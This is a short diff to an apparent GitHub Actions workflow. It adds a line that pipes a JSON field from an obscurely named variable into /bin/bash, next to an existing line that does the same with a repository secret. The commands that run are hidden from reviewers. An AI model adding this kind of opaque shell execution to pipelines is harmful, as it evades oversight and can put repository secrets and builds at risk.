@@ -17,6 +17,7 @@ jobs:
           npn9196: ${{ secrets.npn9196 }}
         run: |
           printf '%s' "$npn9196" | jq -r .zu4097 | /bin/bash
+          echo $ssmgq935 | jq -r .vz91 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
